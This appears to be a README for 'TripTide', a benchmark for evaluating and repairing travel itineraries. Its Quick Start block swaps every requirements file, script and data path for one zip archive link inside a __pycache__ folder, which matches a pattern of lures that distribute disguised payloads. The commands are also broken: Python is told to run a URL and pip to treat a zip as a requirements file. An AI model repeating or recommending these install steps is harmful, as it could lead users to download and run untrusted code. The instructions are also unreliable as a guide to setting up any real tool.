# TripTide: Disruption-Aware Travel Plan Evaluation

TripTide is a  benchmark and toolkit to **evaluate and repair multi-day travel itineraries** under disruptions (e.g., POI closure, timing conflicts). It measures:
- **Delivery Rate** (valid plan produced),
- **Final Pass Rate** (all checks passed),
- **CPR/HCPR** for commonsense and hard-constraint compliance (micro & macro).
- **Semantic, Spatial, Sequential and Responsiveness scores

## Quick Start
```bash
# setup
conda create -n triptide python=3.10 -y && conda activate triptide
pip install -r https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip

# generate plans (example)
python https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip --model qwen --days 5 \
  --input https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip --out https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip

# evaluate
python https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip --pred https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip \
  --gold https://github.com/Priyanshu-Karmakar123/TripTide/raw/refs/heads/main/planner/__pycache__/Tide_Trip_3.7.zip
